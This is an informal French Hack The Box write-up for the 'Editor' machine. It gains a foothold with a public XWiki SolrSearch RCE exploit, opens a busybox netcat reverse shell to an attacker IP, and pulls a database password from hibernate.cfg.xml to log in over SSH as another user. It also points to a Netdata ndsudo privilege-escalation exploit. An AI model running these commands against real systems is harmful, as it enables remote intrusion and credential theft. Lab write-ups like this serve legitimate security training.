<!DOCTYPE html>
<html lang="fr" class="dark">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Editor - Writeup HTB</title>
    <!-- Preload background image -->
    <link rel="preload" href="../../assets/labalsa.jpg" as="image">

    <meta name="description" content="Writeup Hack The Box - Editor">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Zalando+Sans+Expanded:ital,wght@0,200..900;1,200..900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="../../styles.css">
    <link rel="stylesheet" href="../writeups.css">
    <link rel="icon" type="image/jpeg" href="../../assets/favi.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js" defer></script>
</head>

<body class="writeups-mode">
    <nav class="navbar">
        <div class="container">
            <div class="nav-content">
                <a href="../../" class="nav-logo-link">
                    <img src="../../assets/c8e38298-4426-4ed7-ab6b-1c8c5c263f64 (1).png" class="nav-logo"
                        alt="logo signature Raphaël">
                </a>
                <div class="nav-links">
                    <a href="../../" class="nav-link">Accueil</a>
                    <a href="../" class="nav-link active">Writeups</a>
                    <a href="../../Portfolio/" class="nav-link">Galerie</a>
                </div>
            </div>
        </div>
    </nav>

    <main class="min-h-screen">
        <div class="writeups-container">
            <a href="../" class="back-link">← Retour aux writeups</a>
            <div class="writeup-content">
<header><h1 class="page-title" dir="auto">Editor</h1></header><div class="page-body"><div style="display:contents" dir="auto"><h1 id="2b1aa764-c45c-80cc-b759-f488020aa421" class="">User</h1></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-8069-8e64-e4674f3d7d54" class="">Dork : <code>&quot;XWiki Debian 15.10.8&quot; &quot;cve”</code></p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80c7-965f-c11da9d8508b" class="">Résultat : <a href="https://github.com/torjan0/xwiki_solrsearch-rce-exploit">https://github.com/torjan0/xwiki_solrsearch-rce-exploit</a></p></div><div style="display:contents" dir="auto"><pre id="2b1aa764-c45c-8010-bc6e-fb273dca5dfb" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~ $ python3 xwiki_solr_rce.py --target http://10.10.11.80:8080/ cmd --cmd &quot;whoami&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-8049-875b-d32d03916f21" class="">ça fonctionne je met un revshell busybox</p></div><div style="display:contents" dir="auto"><pre id="2b1aa764-c45c-80e1-ace1-d1d041903525" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">~ $ python3 xwiki_solr_rce.py --target http://10.10.11.80:8080/ cmd --cmd &quot;busybox nc 10.10.15.157 9001 -e /bin/bash&quot;</code></pre></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80a7-8b4a-e3e64e50eb92" class="">j’y suis</p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80dd-8bb2-e38edc1e4be2" class="">je transforme en terminal interractif <code>python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</code></p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-808e-ab00-c3de4d84c7b3" class="">je <code>cat /etc/passwd</code></p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-8062-b4ec-db50af8d28b6" class="">ça marche pas ca prends trop longtemps</p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80be-92cd-c147fb553f61" class="">je fais une commande qui demande moins de taf :</p></div><div style="display:contents" dir="auto"><pre id="2b1aa764-c45c-8040-9fc4-dbc5222e3527" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">cat /etc/passwd | cut -d: -f1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
_apt
systemd-network
systemd-resolve
messagebus
systemd-timesync
pollinate
sshd
syslog
uuidd
tcpdump
tss
landscape
fwupd-refresh
usbmux
lxd
dnsmasq
mysql
tomcat
xwiki
netdata
oliver
_laurel</code></pre></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-8013-9682-f74cdbd45e85" class="">me concentrer sur olivier</p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80fc-8626-cb53446338f0" class="">bon je galere ; recontextualisons ; <div class="indented"><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-806c-914d-f540fdd34e57" class="">j’ai une db mysql je ne sais ni ou ni comment elle est<br/>j’ai java qui tourne (je sais grace au ps aux)</p></div><div style="display:contents" dir="auto"></div></div></p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80c7-a6f5-e61b2d891fd3" class="">sur la <a href="https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Configuration/">conf</a> pour voir tout ce qui a un lien avec la db<br/>selon la conf les creds de la db sont dans le fichier de conf Hibernate, jer regarde son nom complet, à savoir <code>hibernate.cfg.xml</code> je le find</p></div><div style="display:contents" dir="auto"><pre id="2b1aa764-c45c-808e-b31c-e797a3e16550" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">xwiki@editor:~$ find / -name &quot;hibernate.cfg.xml&quot; 2&gt;/dev/null
find / -name &quot;hibernate.cfg.xml&quot; 2&gt;/dev/null
/etc/xwiki/hibernate.cfg.xml
/usr/lib/xwiki/WEB-INF/hibernate.cfg.xml
/usr/share/xwiki/templates/mysql/hibernate.cfg.xml</code></pre></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-804c-9338-eac032757410" class="">je cat le premier et bingo j’ai un mdp </p></div><div style="display:contents" dir="auto"><pre id="2b1aa764-c45c-807d-940a-d19962b38ff6" class="code code-wrap"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">xwiki@editor:~$ cat /etc/xwiki/hibernate.cfg.xml | grep password
cat /etc/xwiki/hibernate.cfg.xml | grep password
    &lt;property name=&quot;hibernate.connection.password&quot;&gt;theEd1t0rTeam99&lt;/property&gt;
    &lt;property name=&quot;hibernate.connection.password&quot;&gt;xwiki&lt;/property&gt;
    &lt;property name=&quot;hibernate.connection.password&quot;&gt;xwiki&lt;/property&gt;
    &lt;property name=&quot;hibernate.connection.password&quot;&gt;&lt;/property&gt;
    &lt;property name=&quot;hibernate.connection.password&quot;&gt;xwiki&lt;/property&gt;
    &lt;property name=&quot;hibernate.connection.password&quot;&gt;xwiki&lt;/property&gt;
    &lt;property name=&quot;hibernate.connection.password&quot;&gt;&lt;/property&gt;</code></pre></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80b0-bedc-d21b8ce141f7" class="">Connexion SSH a olivier</p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-8018-bae0-c45b64af8026" class="">ça marche pas</p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-802e-9513-ef67d3beabc5" class="">MDR bon ca marchais pas parce que le mecc s’appelle oliver pas olivier</p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80fd-ae6f-f86dfb218ef9" class="">flag</p></div><div style="display:contents" dir="auto"><h1 id="2b1aa764-c45c-8011-88cb-d3700dba5dd1" class="">Root</h1></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-803f-8950-e115a9773376" class="">dans le resultat linPEAS la piste la plus interesssante semble etre <code>netdata</code></p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-8040-8996-f39597bc3211" class="">je dork cve sur netdata et yen a une qui reviens</p></div><div style="display:contents" dir="auto"><p id="2b1aa764-c45c-80de-88cf-e37ec9cda9f1" class=""><a href="https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation/tree/main">https://github.com/dollarboysushil/CVE-2024-32019-Netdata-ndsudo-PATH-Vulnerability-Privilege-Escalation/tree/main</a></p></div><div style="display:contents" dir="auto"></div></div>
            </div>
        </div>
    </main>
</body>

</html>
